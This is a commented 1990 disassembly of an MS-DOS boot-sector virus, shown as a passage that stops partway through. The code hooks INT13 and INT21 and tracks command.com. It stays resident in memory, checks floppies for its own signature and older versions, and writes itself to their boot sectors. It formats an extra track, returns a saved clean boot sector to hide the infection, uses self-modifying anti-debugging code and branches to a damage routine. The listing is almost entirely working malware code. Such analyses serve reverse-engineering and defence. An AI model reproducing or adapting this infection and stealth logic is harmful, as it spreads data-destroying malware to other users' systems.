>> AFD  print out    7-15-1990    18:51                                       <<

TOP:0100  5224           DW     2452            ; Indentical number

TOP:0102  EB2D           JMP    0131            ; Cold Boot
TOP:0104  90             NOP
TOP:0105  90             NOP
TOP:0106  EB09           JMP    0111            ; Warm Boot
TOP:0108  90             NOP
TOP:0109  90             NOP
TOP:010A  E9EA05         JMP    06F7            ; Attack
TOP:010D  C211           DW     11C2            ; End1
TOP:010F  6E11           DW     116E            ; Start1


                                                ; In the case of Warm Boot
TOP:0111  5E           * POP    SI              ; Restore DPT (INT 1E)
TOP:0112  1F             POP    DS              ; Saved in boot sector
TOP:0113  8F04           POP    [SI]
TOP:0115  8F4402         POP    [SI+02]

TOP:0118  BE000F         MOV    SI,0F00         ; Copy own boot sector
TOP:011B  BF007C         MOV    DI,7C00         ; to 0:7C00
TOP:011E  0E             PUSH   CS
TOP:011F  1F             POP    DS
TOP:0120  33C0           XOR    AX,AX
TOP:0122  8EC0           MOV    ES,AX
TOP:0124  B90001         MOV    CX,0100
TOP:0127  9C             PUSHF
TOP:0128  FC             CLD
TOP:0129  F3A5           REP    MOVSW
TOP:012B  9D             POPF
TOP:012C  EA007C0000     JMP    0000:7C00       ; Execute it

                                                ; In the case of Cold Boot
TOP:0131  33C0         * XOR    AX,AX
TOP:0133  56             PUSH   SI              ; Clear Flags
TOP:0134  57             PUSH   DI
TOP:0135  51             PUSH   CX
TOP:0136  FC             CLD
TOP:0137  BFA201         MOV    DI,01A2         ; 6 bytes
TOP:013A  BEA801         MOV    SI,01A8
TOP:013D  AA           * STOSB
TOP:013E  3BFE           CMP    DI,SI
TOP:0140  72FB           JC     013D
TOP:0142  59             POP    CX
TOP:0143  5F             POP    DI
TOP:0144  5E             POP    SI
TOP:0145  8EC0           MOV    ES,AX

TOP:0147  26A14C00       MOV    AX,ES:[004C]    ; Save INT13
TOP:014B  2EA39401       MOV    CS:[0194],AX
TOP:014F  26A14E00       MOV    AX,ES:[004E]
TOP:0153  2EA39601       MOV    CS:[0196],AX
TOP:0157  B8A003         MOV    AX,03A0         ; Set INT13 to TOP:03A0
TOP:015A  26A34C00       MOV    ES:[004C],AX
TOP:015E  268C0E4E00     MOV    ES:[004E],CS
TOP:0163  26A18400       MOV    AX,ES:[0084]    ; Save INT21
TOP:0167  2EA39901       MOV    CS:[0199],AX
TOP:016B  26A18600       MOV    AX,ES:[0086]
TOP:016F  2EA39B01       MOV    CS:[019B],AX

TOP:0173  B800F0         MOV    AX,F000         ; Look for RESET vector
TOP:0176  8EC0           MOV    ES,AX
TOP:0178  26A0F0FF       MOV    AL,ES:[FFF0]
TOP:017C  3CEA           CMP    AL,EA           ; If not far JMP
TOP:017E  7591           JNZ    0111            ; Jump to warm boot
TOP:0180  26A1F1FF       MOV    AX,ES:[FFF1]    ; If far JMP save
TOP:0184  2EA32C03       MOV    CS:[032C],AX    ;   segment and offset address
TOP:0188  26A1F3FF       MOV    AX,ES:[FFF3]
TOP:018C  2EA32E03       MOV    CS:[032E],AX
TOP:0190  E97EFF         JMP    0111            ; Jump to warm boot

TOP:0193  EA1A0300C8     JMP    C800:031A       ; INT13 original value
TOP:0198  EA8D139102     JMP    0291:138D       ; INT21 original value
TOP:019D  EA59EC00F0     JMP    F000:EC59       ; INT40 original value

TOP:01A2  80             DB     80              ; Flag1
                                                ; 80: INT21 is created
TOP:01A3  00             DB     0               ; Flag2
TOP:01A4  00             DB     0               ; Flag3
TOP:01A5  00             DB     0               ; Flag4
                                                ; FileHandle of 'command.com'

TOP:01A6  00             DB     0               ; Flag5
TOP:01A7  00             DB     0               ; Flag6
                                                ; 50: after INT40 is set

TOP:01A8  00             DB     0
TOP:01A9  00             DB     0               ; Saved drive number

                                                ; Call original INT13
TOP:01AA  80FA00         CMP    DL,00           ; Check drive number
TOP:01AD  740B           JZ     01BA
TOP:01AF  9C           * PUSHF
TOP:01B0  0E             PUSH   CS
TOP:01B1  2E8A16A901     MOV    DL,CS:[01A9]    ; Call INT13
TOP:01B6  E8DAFF         CALL   0193            ; Call original INT13
TOP:01B9  C3             RET

TOP:01BA  50           * PUSH   AX
TOP:01BB  2EA0A701       MOV    AL,CS:[01A7]
TOP:01BF  3C50           CMP    AL,50           ; (Check if INT40 is set)
TOP:01C1  58             POP    AX
TOP:01C2  EBEB           JMP    01AF


TOP:01C4  9C             PUSHF
TOP:01C5  0E             PUSH   CS
TOP:01C6  E8D4FF         CALL   019D
TOP:01C9  C3             RET

TOP:01CA  50             PUSH   AX              ;
TOP:01CB  51             PUSH   CX
TOP:01CC  52             PUSH   DX
TOP:01CD  1E             PUSH   DS
TOP:01CE  33C0           XOR    AX,AX           ; Save address of DskParTbl
TOP:01D0  8ED8           MOV    DS,AX
TOP:01D2  A17800         MOV    AX,[0078]
TOP:01D5  2EA3320A       MOV    CS:[0A32],AX
TOP:01D9  A17A00         MOV    AX,[007A]
TOP:01DC  2EA3340A       MOV    CS:[0A34],AX


                                                ; Set address of
                                                ;  Disk Parameter Table
                                                ; Set address of sector
                                                ;  descriptor
TOP:01E0  2EA00106       MOV    AL,CS:[0601]
TOP:01E4  3C28           CMP    AL,28           ; Check sectors/track
TOP:01E6  7406           JZ     01EE

TOP:01E8  BB420A         MOV    BX,0A42         ; Number of tracks != 0x28
TOP:01EB  EB0A           JMP    01F7
TOP:01ED  90             NOP

TOP:01EE  BB8E0A       * MOV    BX,0A8E         ; Number of tracks = 0x28
TOP:01F1  B9160A         MOV    CX,0A16
TOP:01F4  EB18           JMP    020E
TOP:01F6  90             NOP

TOP:01F7  2EA10406     * MOV    AX,CS:[0604]
TOP:01FB  B9FA09         MOV    CX,09FA         ; Sectors/track = 0x0f
TOP:01FE  3D0F00         CMP    AX,000F
TOP:0201  740B           JZ     020E

TOP:0203  B9080A         MOV    CX,0A08
TOP:0206  3D0900         CMP    AX,0009         ; Sectors/track = 0x09
TOP:0209  7403           JZ     020E

TOP:020B  B9240A         MOV    CX,0A24         ; Sectors/track = other

TOP:020E  890E7800     * MOV    [0078],CX       ; Set Disk Parameter Table
TOP:0212  8C0E7A00       MOV    [007A],CS
TOP:0216  1F             POP    DS
TOP:0217  5A             POP    DX
TOP:0218  59             POP    CX
TOP:0219  58             POP    AX

TOP:021A  E88DFF         CALL   01AA            ; Call original INT13

TOP:021D  50             PUSH   AX              ; Restore Disk Parameter Table
TOP:021E  51             PUSH   CX
TOP:021F  52             PUSH   DX
TOP:0220  1E             PUSH   DS
TOP:0221  9C             PUSHF
TOP:0222  33C0           XOR    AX,AX
TOP:0224  8ED8           MOV    DS,AX
TOP:0226  2EA1320A       MOV    AX,CS:[0A32]
TOP:022A  A37800         MOV    [0078],AX
TOP:022D  2EA1340A       MOV    AX,CS:[0A34]
TOP:0231  A37A00         MOV    [007A],AX
TOP:0234  9D             POPF
TOP:0235  1F             POP    DS
TOP:0236  5A             POP    DX
TOP:0237  59             POP    CX
TOP:0238  58             POP    AX
TOP:0239  C3             RET                    ; Return

TOP:023A  9C             PUSHF                  ; Call original INT 21
TOP:023B  0E             PUSH   CS
TOP:023C  E859FF         CALL   0198
TOP:023F  C3             RET

                                                ; INT 21 Entry Point
TOP:0240  80FC3D       * CMP    AH,3D           ; Open File
TOP:0243  7541           JNZ    0286
TOP:0245  53             PUSH   BX              ; Save registers
TOP:0246  51             PUSH   CX
TOP:0247  50             PUSH   AX
TOP:0248  52             PUSH   DX
TOP:0249  06             PUSH   ES
TOP:024A  1E             PUSH   DS
TOP:024B  8BDA           MOV    BX,DX
TOP:024D  8A07         * MOV    AL,[BX]         ; Search for End of Filename
TOP:024F  3C00           CMP    AL,00
TOP:0251  7403           JZ     0256
TOP:0253  43             INC    BX
TOP:0254  EBF7           JMP    024D

TOP:0256  56             PUSH   SI              ; Compare Filename to
                                                ; 'command.com'
TOP:0257  BE9F03         MOV    SI,039F
TOP:025A  4B             DEC    BX
TOP:025B  4E             DEC    SI
TOP:025C  B90B00         MOV    CX,000B
TOP:025F  8A07           MOV    AL,[BX]
TOP:0261  0C20           OR     AL,20
TOP:0263  2E3A04         CMP    AL,CS:[SI]
TOP:0266  7403           JZ     026B
TOP:0268  E91F01         JMP    038A
TOP:026B  4E             DEC    SI
TOP:026C  4B             DEC    BX
TOP:026D  E2F0           LOOP   025F

TOP:026F  5E             POP    SI              ; The filename is 'command.com'
TOP:0270  1F             POP    DS
TOP:0271  07             POP    ES
TOP:0272  5A             POP    DX
TOP:0273  58             POP    AX
TOP:0274  59             POP    CX
TOP:0275  5B             POP    BX
TOP:0276  E8C1FF         CALL   023A            ; Call original INT 21
TOP:0279  7303           JNC    027E            ; Return, if error
TOP:027B  CA0200         RET    Far  0002       ; Clear stack (0002)
TOP:027E  2EA3A501       MOV    CS:[01A5],AX    ; Save FileHandle
TOP:0282  F8             CLC
TOP:0283  CA0200         RET    Far  0002       ; Return, clear stack (0002)

TOP:0286  80FC3E       * CMP    AH,3E           ; Close File
TOP:0289  7403           JZ     028E
TOP:028B  E90AFF         JMP    0198

TOP:028E  2E3B1EA501     CMP    BX,CS:[01A5]    ; Check FileHandle to
                                                ; command.com's handle
TOP:0293  7403           JZ     0298
TOP:0295  E900FF         JMP    0198            ; Jump to original INT21
TOP:0298  2E833EA50100   CMP    CS:[01A5],0000  ; It's already opened ?
TOP:029E  7503           JNZ    02A3
TOP:02A0  E9F5FE         JMP    0198

                                                ; Close 'command.com'
TOP:02A3  2EC706A5010000 MOV    CS:[01A5],0000  ; Clear FileHandle
TOP:02AA  E88DFF         CALL   023A            ; Call original INT21
                                                ; close 'command.com'

TOP:02AD  1E             PUSH   DS              ; Save register
TOP:02AE  06             PUSH   ES
TOP:02AF  50             PUSH   AX
TOP:02B0  53             PUSH   BX
TOP:02B1  51             PUSH   CX
TOP:02B2  52             PUSH   DX
TOP:02B3  2EC606D00200   MOV    CS:[02D0],00    ; Set TOP or not TOP flag
TOP:02B9  BB0002       * MOV    BX,0200         ; Allocate 0x2000 bytes
TOP:02BC  B448           MOV    AH,48
TOP:02BE  E879FF         CALL   023A
TOP:02C1  81FB0002       CMP    BX,0200
TOP:02C5  730A           JNC    02D1            ; Jump if no error
TOP:02C7  5A           * POP    DX              ; Return, if error
TOP:02C8  59             POP    CX
TOP:02C9  5B             POP    BX
TOP:02CA  58             POP    AX
TOP:02CB  07             POP    ES
TOP:02CC  1F             POP    DS
TOP:02CD  CA0200         RET    Far  0002

TOP:02D0  01             DB     1               ; Number of probes for
                                                ; allocating memory

TOP:02D1  50           * PUSH   AX              ; Up to 3 probe for
TOP:02D2  25FF0F         AND    AX,0FFF         ;  allocating a segment,
TOP:02D5  3DB00D         CMP    AX,0DB0         ;  which segment register
TOP:02D8  7210           JC     02EA            ;  & 0x0ffff < 0x0db0
TOP:02DA  58             POP    AX
TOP:02DB  2E803ED00203   CMP    CS:[02D0],03
TOP:02E1  74E4           JZ     02C7            ; It was the last probe
TOP:02E3  2EFE06D002     INC    B/CS:[02D0]
TOP:02E8  EBCF           JMP    02B9            ; Jump to next probe

TOP:02EA  58           * POP    AX              ; There is a good memory area
TOP:02EB  8EC0           MOV    ES,AX
TOP:02ED  2EA3680B       MOV    CS:[0B68],AX    ; Save segment register

TOP:02F1  BE0000         MOV    SI,0000         ; Copy virus code to the
TOP:02F4  BF0000         MOV    DI,0000         ;  allocated segment
TOP:02F7  B90010         MOV    CX,1000
TOP:02FA  0E             PUSH   CS
TOP:02FB  1F             POP    DS
TOP:02FC  9C             PUSHF
TOP:02FD  FC             CLD
TOP:02FE  F3A5           REP    MOVSW
TOP:0300  9D             POPF

TOP:0301  33C0           XOR    AX,AX           ; Clear DS register
TOP:0303  8ED8           MOV    DS,AX
TOP:0305  B80000         MOV    AX,0000         ; Clear twice (WHY?)
TOP:0308  8ED8           MOV    DS,AX
TOP:030A  B84002         MOV    AX,0240         ; Search CS:240 (INT21 call)
TOP:030D  8CCA           MOV    DX,CS
TOP:030F  BB0000         MOV    BX,0000         ; From 0 to
TOP:0312  B9F0FF         MOV    CX,FFF0         ;           FFF0
TOP:0315  E85E00       * CALL   0376            ; Call search
TOP:0318  7516           JNZ    0330
TOP:031A  50             PUSH   AX              ; Restore original INT21 vector
TOP:031B  2EA19901       MOV    AX,CS:[0199]
TOP:031F  8907           MOV    [BX],AX
TOP:0321  2EA19B01       MOV    AX,CS:[019B]
TOP:0325  894702         MOV    [BX+02],AX
TOP:0328  58             POP    AX
TOP:0329  EBEA           JMP    0315            ; Search again

TOP:032B  EA5BE000F0   * JMP    F000:E05B       ; Original value of RESET vect.

TOP:0330  B8A003       * MOV    AX,03A0         ; Search CS:03A0 (INT13 call)
TOP:0333  8CCA           MOV    DX,CS
TOP:0335  BB0000         MOV    BX,0000         ; From 0 to
TOP:0338  B9F0FF         MOV    CX,FFF0         ;           FFF0
TOP:033B  E83800       * CALL   0376            ; Call search
TOP:033E  7509           JNZ    0349
TOP:0340  50             PUSH   AX              ; Modify caller's segment
TOP:0341  8CC0           MOV    AX,ES
TOP:0343  894702         MOV    [BX+02],AX
TOP:0346  58             POP    AX
TOP:0347  EBF2           JMP    033B            ; Search again

TOP:0349  B80000       * MOV    AX,0000         ; Save INT40 vector
TOP:034C  8ED8           MOV    DS,AX
TOP:034E  A10001         MOV    AX,[0100]
TOP:0351  26A39E01       MOV    ES:[019E],AX
TOP:0355  A10201         MOV    AX,[0102]
TOP:0358  26A3A001       MOV    ES:[01A0],AX
TOP:035C  E85507         CALL   0AB4
TOP:035F  B84504         MOV    AX,0445         ; Mov AX,0445 (Maybe INT40
                                                ;              offset)

TOP:0362  E962FF         JMP    02C7            ; Jump to return

TOP:0365  A30001         MOV    [0100],AX       ; Set INT40 to ES:AX
TOP:0368  8CC0           MOV    AX,ES
TOP:036A  A30201         MOV    [0102],AX
TOP:036D  26C606A70150   MOV    ES:[01A7],50    ; Set FLAG6 to 50
TOP:0373  E951FF         JMP    02C7            ; Jump to return

                                                ; Look for DX:AX, in DS segment
                                                ;  from BX to BX+CX
TOP:0376  50             PUSH   AX              ; If found Z is set, and
TOP:0377  52             PUSH   DX              ;  the result is in BX
TOP:0378  3907         * CMP    [BX],AX         ; Check [BX]
TOP:037A  7407           JZ     0383
TOP:037C  43           * INC    BX
TOP:037D  E2F9           LOOP   0378
TOP:037F  41             INC    CX
TOP:0380  5A           * POP    DX
TOP:0381  58             POP    AX
TOP:0382  C3             RET
TOP:0383  395702       * CMP    [BX+02],DX      ; Check [BX+02]
TOP:0386  75F4           JNZ    037C
TOP:0388  EBF6           JMP    0380

TOP:038A  5E           * POP    SI
TOP:038B  1F             POP    DS
TOP:038C  07             POP    ES
TOP:038D  5A             POP    DX
TOP:038E  58             POP    AX
TOP:038F  59             POP    CX
TOP:0390  5B             POP    BX
TOP:0391  E904FE         JMP    0198            ; Jump to original INT 21


TOP:0394  636F6D6D616E64
          2E636F6D00     DB     'command.com',0


TOP:03A0  53           * PUSH   BX              ; INT13 Entry Point
TOP:03A1  50             PUSH   AX
TOP:03A2  51             PUSH   CX
TOP:03A3  52             PUSH   DX
TOP:03A4  06             PUSH   ES
TOP:03A5  1E             PUSH   DS
TOP:03A6  57             PUSH   DI
TOP:03A7  56             PUSH   SI
TOP:03A8  0E             PUSH   CS
TOP:03A9  1F             POP    DS


;----------------------------------------------------------------------------
                                                ; A comforter for hackers
TOP:03AA  51             PUSH   CX              ; Save some registers
TOP:03AB  50             PUSH   AX
TOP:03AC  52             PUSH   DX
TOP:03AD  BBC203         MOV    BX,03C2
TOP:03B0  B90200         MOV    CX,0002         ; 2 probe
TOP:03B3  E80700       * CALL   03BD            ; Call CARRY_OR_NOT_? subrutine
TOP:03B6  7217           JC     03CF            ; If Carry jump next
TOP:03B8  E2F9           LOOP   03B3
TOP:03BA  E96EFF         JMP    032B            ; Jump to original RESET vector

TOP:03BD  B090           MOV    AL,90           ; CARRY_OR_NOT_? subrutine
TOP:03BF  F8             CLC
TOP:03C0  8807           MOV    [BX],AL         ; Modify next instruction

TOP:03C2  F9             STC                    ; Execute STC, but this byte
                                                ;  is 90 (NOP) already
TOP:03C3  90             NOP                    ; Now CARRY is SET ! (WHY ?)
TOP:03C4  90             NOP
TOP:03C5  90             NOP
TOP:03C6  90             NOP
TOP:03C7  90             NOP
TOP:03C8  90             NOP
TOP:03C9  90             NOP
TOP:03CA  B0F9           MOV    AL,F9           ; Restore THAT instruction
TOP:03CC  8807           MOV    [BX],AL
TOP:03CE  C3             RET                    ; Return

TOP:03CF  5A           * POP    DX              ; Restore registers
TOP:03D0  58             POP    AX
TOP:03D1  59             POP    CX
;----------------------------------------------------------------------------


TOP:03D2  2E803EB30A01   CMP    CS:[0AB3],01
TOP:03D8  7503           JNZ    03DD
TOP:03DA  E9D807         JMP    0BB5            ; Jump to Demage
TOP:03DD  2E8816A901   * MOV    CS:[01A9],DL    ; Save Drive number

TOP:03E2  80FC02         CMP    AH,02           ; AH=2 or AH=3 (read or write)
TOP:03E5  7215           JC     03FC
TOP:03E7  80FC04         CMP    AH,04
TOP:03EA  7310           JNC    03FC
TOP:03EC  83F903         CMP    CX,0003         ; Check, if it is the 1. three
TOP:03EF  730B           JNC    03FC            ; sector
TOP:03F1  80FE00         CMP    DH,00
TOP:03F4  7506           JNZ    03FC

TOP:03F6  2EC606A40180   MOV    CS:[01A4],80    ; If it is set FLAG4 to 80

TOP:03FC  2EA0A201     * MOV    AL,CS:[01A2]    ; Check, if memory has already
TOP:0400  3C80           CMP    AL,80           ;  allocated
TOP:0402  7420           JZ     0424

TOP:0404  33C0           XOR    AX,AX           ; Check INT 21 vector
TOP:0406  8EC0           MOV    ES,AX
TOP:0408  26A18400       MOV    AX,ES:[0084]
TOP:040C  2E3B069901     CMP    AX,CS:[0199]    ; If the saved vector is other
TOP:0411  7403           JZ     0416            ;  than the valid vector
TOP:0413  E9B302         JMP    06C9            ;  jump to creating INT21

TOP:0416  26A18600     * MOV    AX,ES:[0086]
TOP:041A  2E3B069B01     CMP    AX,CS:[019B]
TOP:041F  7403           JZ     0424
TOP:0421  E9A502         JMP    06C9            ; Jump to creating INT21

TOP:0424  81FFAA55     * CMP    DI,55AA         ; If DI is 55AA and
TOP:0428  750B           JNZ    0435
TOP:042A  81FEA55A       CMP    SI,5AA5         ; SI is 5AA5 then
TOP:042E  7505           JNZ    0435
TOP:0430  5E             POP    SI
TOP:0431  BE5AA5         MOV    SI,A55A         ; set SI to A55A for a return
TOP:0434  56             PUSH   SI              ;                      value

TOP:0435  80FA20       * CMP    DL,20           ; Check dirve number
TOP:0438  720E           JC     0448            ; Jump, if floppy
TOP:043A  80FA80         CMP    DL,80
TOP:043D  7403           JZ     0442            ; Jump, if the 1. hard drive
TOP:043F  E9AA02         JMP    06EC            ; Jump,if other (nothing to do)

TOP:0442  E97B03       * JMP    07C0

TOP:0445  E955FD       * JMP    019D            ; Maybe INT40 Entry Point
                                                ; Jump to original INT40


TOP:0448  2EA0A401     * MOV    AL,CS:[01A4]    ; The drive is floppy
TOP:044C  3C80           CMP    AL,80
TOP:044E  742E           JZ     047E
TOP:0450  80FC05         CMP    AH,05           ; Check for format
TOP:0453  7509           JNZ    045E
TOP:0455  2EC606A40184 * MOV    CS:[01A4],84
TOP:045B  EB0A           JMP    0467
TOP:045D  90             NOP

TOP:045E  3C00         * CMP    AL,00
TOP:0460  7405           JZ     0467
TOP:0462  2EFE0EA401     DEC    B/CS:[01A4]

TOP:0467  E99500       * JMP    04FF

;-----------------------------------------------------------------------
TOP:046A  E83DFD         CALL   01AA            ; Call original INT13
TOP:046D  730C           JNC    047B
TOP:046F  80FC06         CMP    AH,06           ; If error check the errcode
TOP:0472  7506           JNZ    047A
TOP:0474  2EC606A40180   MOV    CS:[01A4],80    ; Set FLAG3 to 80 if errcode=06
TOP:047A  F9             STC
TOP:047B  CA0200         RET    Far  0002       ; Return to caller

TOP:047E  2EC606A30100 * MOV    CS:[01A3],00    ;
TOP:0484  80FC05         CMP    AH,05           ; Check for format
TOP:0487  74CC           JZ     0455
                                                ; Load the boot sector
                                                ;  of the floppy
TOP:0489  B90300         MOV    CX,0003         ; Probe 3 times
TOP:048C  51           * PUSH   CX
TOP:048D  2EC606A40100   MOV    CS:[01A4],00
TOP:0493  BB0011         MOV    BX,1100
TOP:0496  B80102         MOV    AX,0201         ; Load to CS:1100
TOP:0499  B90100         MOV    CX,0001
TOP:049C  BA0000         MOV    DX,0000
TOP:049F  0E             PUSH   CS
TOP:04A0  07             POP    ES
TOP:04A1  E806FD         CALL   01AA            ; Call original INT13
TOP:04A4  59             POP    CX
TOP:04A5  7305           JNC    04AC
TOP:04A7  E2E3           LOOP   048C
TOP:04A9  E94002         JMP    06EC            ; Jump to original INT13

TOP:04AC  0E           * PUSH   CS              ; Search in boot sector
TOP:04AD  1F             POP    DS
TOP:04AE  BB0011         MOV    BX,1100
TOP:04B1  B90002         MOV    CX,0200
TOP:04B4  B8FBCD         MOV    AX,CDFB         ; Search: FB CD 13 72
TOP:04B7  BA1372         MOV    DX,7213
TOP:04BA  E8B9FE         CALL   0376
TOP:04BD  7403           JZ     04C2            ; If not found
TOP:04BF  E92A02         JMP    06EC            ;  jump to original INT13

TOP:04C2  2EC606FD0401   MOV    CS:[04FD],01    ; If found, remember it
TOP:04C8  8B4705         MOV    AX,[BX+05]
TOP:04CB  3DCD12         CMP    AX,12CD         ; Check, if the floppy has
                                                ;  infected
TOP:04CE  2E891E9309     MOV    CS:[0993],BX    ; Save the search string place

TOP:04D3  2EC70602060803 MOV    CS:[0602],0308
TOP:04DA  7403           JZ     04DF
TOP:04DC  E9BE00         JMP    059D            ; Jump to infection

TOP:04DF  2E8A871700   * MOV    AL,CS:[BX+0017] ; Load version of that virus
TOP:04E4  3C17           CMP    AL,17           ; check it
TOP:04E6  750B           JNZ    04F3
TOP:04E8  2E8B871800     MOV    AX,CS:[BX+0018]
TOP:04ED  3B068E07       CMP    AX,[078E]
TOP:04F1  730C           JNC    04FF

TOP:04F3  2EC70602060703 MOV    CS:[0602],0307
TOP:04FA  E9A000         JMP    059D            ; Jump to infection

TOP:04FD  0100           DW     1               ; FLAG_4FD
                                                ; 0: No infection
                                                ; 1: Infection
TOP:04FF  5E           * POP    SI
TOP:0500  5F             POP    DI
TOP:0501  1F             POP    DS
TOP:0502  07             POP    ES
TOP:0503  5A             POP    DX
TOP:0504  59             POP    CX
TOP:0505  58             POP    AX
TOP:0506  5B             POP    BX
TOP:0507  80FE00         CMP    DH,00           ; Check for r/w the 1st sector
TOP:050A  7403           JZ     050F
TOP:050C  E95BFF         JMP    046A
TOP:050F  83F901       * CMP    CX,0001
TOP:0512  7403           JZ     0517
TOP:0514  E953FF         JMP    046A
TOP:0517  80FC02       * CMP    AH,02
TOP:051A  7408           JZ     0524
TOP:051C  80FC03         CMP    AH,03
TOP:051F  7423           JZ     0544
TOP:0521  E946FF         JMP    046A            ; Jump, if not the 1st sect r/w

TOP:0524  E883FC       * CALL   01AA            ; read the absolut 1st sector
TOP:0527  7303           JNC    052C
TOP:0529  E943FF         JMP    046F
TOP:052C  2E803EA20180   CMP    CS:[01A2],80    ; Check FLAG1
TOP:0532  7403           JZ     0537            ; Jump, if 80
TOP:0534  E933FF         JMP    046A
TOP:0537  56           * PUSH   SI
TOP:0538  9C             PUSHF
TOP:0539  BE9509         MOV    SI,0995         ; Address of the correct boot
                                                ;  sector's part
TOP:053C  E83B00         CALL   057A            ; Copy correct boot sector's
TOP:053F  9D             POPF                   ;  part to the ES:BX buffer
TOP:0540  5E             POP    SI
TOP:0541  E937FF         JMP    047B            ; Jump to return to caller

TOP:0544  2E803EFD0401 * CMP    CS:[04FD],01    ; write the absolut 1st sector
TOP:054A  7403           JZ     054F            ; If FLAG_4FD is 0 ->
TOP:054C  EB20           JMP    056E            ;  not change
TOP:054E  90             NOP
TOP:054F  2EC606FD0400 * MOV    CS:[04FD],00
TOP:0555  53             PUSH   BX
TOP:0556  50             PUSH   AX
TOP:0557  51             PUSH   CX
TOP:0558  52             PUSH   DX
TOP:0559  06             PUSH   ES
TOP:055A  1E             PUSH   DS
TOP:055B  57             PUSH   DI
TOP:055C  56             PUSH   SI
TOP:055D  06             PUSH   ES
TOP:055E  1F             POP    DS
TOP:055F  0E             PUSH   CS
TOP:0560  07             POP    ES
TOP:0561  B90002         MOV    CX,0200         ; Copy the sector to CS:1100
TOP:0564  8BF3           MOV    SI,BX
TOP:0566  BF0011         MOV    DI,1100
TOP:0569  F3A4           REP    MOVSB
TOP:056B  EB46           JMP    05B3            ; Jump
TOP:056D  90             NOP


TOP:056E  5B           * POP    BX              ; Restore registers
TOP:056F  59             POP    CX
TOP:0570  59             POP    CX
TOP:0571  5A             POP    DX
TOP:0572  07             POP    ES
TOP:0573  1F             POP    DS
TOP:0574  5F             POP    DI
TOP:0575  5E             POP    SI
TOP:0576  F8             CLC
TOP:0577  E901FF         JMP    047B            ; Jump to return to caller

TOP:057A  53             PUSH   BX              ; Copy block from CS:SI
TOP:057B  50             PUSH   AX              ;  to ES:BX+(CS:[0993])
TOP:057C  51             PUSH   CX
TOP:057D  52             PUSH   DX              ; If SI=995, it will copy
TOP:057E  57             PUSH   DI              ;  a part of a correct boot
TOP:057F  1E             PUSH   DS              ;  sector
TOP:0580  0E             PUSH   CS
TOP:0581  1F             POP    DS
TOP:0582  2EA19309       MOV    AX,CS:[0993]    ; Where the indentical string
                                                ;  found
TOP:0586  25FF00         AND    AX,00FF         ; Compute destination
TOP:0589  03D8           ADD    BX,AX
TOP:058B  8BFB           MOV    DI,BX
TOP:058D  B95900         MOV    CX,0059         ; Number of bytes
TOP:0590  9C             PUSHF
TOP:0591  FC             CLD
TOP:0592  F3A4           REP    MOVSB           ; Copy block
TOP:0594  9D             POPF
TOP:0595  1F             POP    DS
TOP:0596  5F             POP    DI
TOP:0597  5A             POP    DX
TOP:0598  59             POP    CX
TOP:0599  58             POP    AX
TOP:059A  5B             POP    BX
TOP:059B  F8             CLC
TOP:059C  C3             RET                    ; Return

TOP:059D  BB0011         MOV    BX,1100         ; Write boot sector to floppy
TOP:05A0  B80103         MOV    AX,0301         ; Check for writing !
TOP:05A3  B90100         MOV    CX,0001
TOP:05A6  BA0000         MOV    DX,0000
TOP:05A9  0E             PUSH   CS
TOP:05AA  07             POP    ES
TOP:05AB  E8FCFB         CALL   01AA            ; Call original INT13
TOP:05AE  7303           JNC    05B3            ; If error
TOP:05B0  E93901         JMP    06EC            ;  jump to original INT13


TOP:05B3  0E           * PUSH   CS              ; Save disk parameters
TOP:05B4  1F             POP    DS
TOP:05B5  BB0011         MOV    BX,1100
TOP:05B8  8B4718         MOV    AX,[BX+18]      ; Sector/track
TOP:05BB  2EA30406       MOV    CS:[0604],AX
TOP:05BF  8B4F1A         MOV    CX,[BX+1A]      ; Head number
TOP:05C2  F7E1           MUL    CX
TOP:05C4  8BC8           MOV    CX,AX           ; CX = Heads * sector/track
TOP:05C6  8B4713         MOV    AX,[BX+13]      ; AX = number of total sectors
TOP:05C9  BA0000         MOV    DX,0000
TOP:05CC  F7F1           DIV    CX              ; AX = AX/CX
                                                ; AX = number of tracks
TOP:05CE  2EA20106       MOV    CS:[0601],AL    ; Save number of tracks
TOP:05D2  8AE8           MOV    CH,AL
TOP:05D4  B001           MOV    AL,01
TOP:05D6  90             NOP
TOP:05D7  B105           MOV    CL,05
TOP:05D9  B405           MOV    AH,05           ; INT13 SubFn: Format a track
TOP:05DB  0E             PUSH   CS
TOP:05DC  07             POP    ES
TOP:05DD  BA0000         MOV    DX,0000
TOP:05E0  51             PUSH   CX
TOP:05E1  2E813E02060703 CMP    CS:[0602],0307  ; Other version of virus ?
TOP:05E8  F8             CLC
TOP:05E9  740C           JZ     05F7
TOP:05EB  2E803EFD0400   CMP    CS:[04FD],00    ; No infection ?
TOP:05F1  F8             CLC
TOP:05F2  7403           JZ     05F7

TOP:05F4  E8D3FB         CALL   01CA            ; Call format a track !

TOP:05F7  1E             PUSH   DS
TOP:05F8  50             PUSH   AX
TOP:05F9  58             POP    AX
TOP:05FA  1F             POP    DS
TOP:05FB  59             POP    CX
TOP:05FC  7308           JNC    0606            ; If error
TOP:05FE  E9EB00         JMP    06EC            ;  jump to original INT13

TOP:0601  28             DB     28              ; Number of tracks
TOP:0602  0803           DW     308             ; 0308: If the same virus found
                                                ; 0307: Other version found
                                                ; Load it to AX, before calling
                                                ;  INT13: 03: write sector
                                                ;         07/08: number of sect
TOP:0604  0900           DW     9               ; Sectors / track

TOP:0606  BE0011         MOV    SI,1100         ; Copy boot sector to 0F00
TOP:0609  BF000F         MOV    DI,0F00         ;  (Save the original boot)
TOP:060C  0E             PUSH   CS
TOP:060D  1F             POP    DS
TOP:060E  51             PUSH   CX
TOP:060F  B90001         MOV    CX,0100
TOP:0612  9C             PUSHF
TOP:0613  FC             CLD
TOP:0614  F3A5           REP    MOVSW
TOP:0616  9D             POPF
TOP:0617  59             POP    CX

                                                ; Call INT13 with the action
                                                ;  saved in [0602]/W (AX)
TOP:0618  51             PUSH   CX              ; 0307: Write 7 sectors
TOP:0619  2EA10206       MOV    AX,CS:[0602]            (0100-0EFF)
TOP:061D  BA0000         MOV    DX,0000         ; 0308: Write 8 sectors
TOP:0620  B101           MOV    CL,01                   (0100-10FF)
TOP:0622  BB0001         MOV    BX,0100
TOP:0625  2E803EFD0400   CMP    CS:[04FD],00    ; Check infection flag
TOP:062B  F8             CLC
TOP:062C  7403           JZ     0631
TOP:062E  E879FB         CALL   01AA
TOP:0631  59           * POP    CX
TOP:0632  7303           JNC    0637            ; If error
TOP:0634  E9B500         JMP    06EC            ;  jump to original INT13

TOP:0637  0E           * PUSH   CS              ; Search for indentical string
TOP:0638  1F             POP    DS              ;  in the boot sector
TOP:0639  51             PUSH   CX
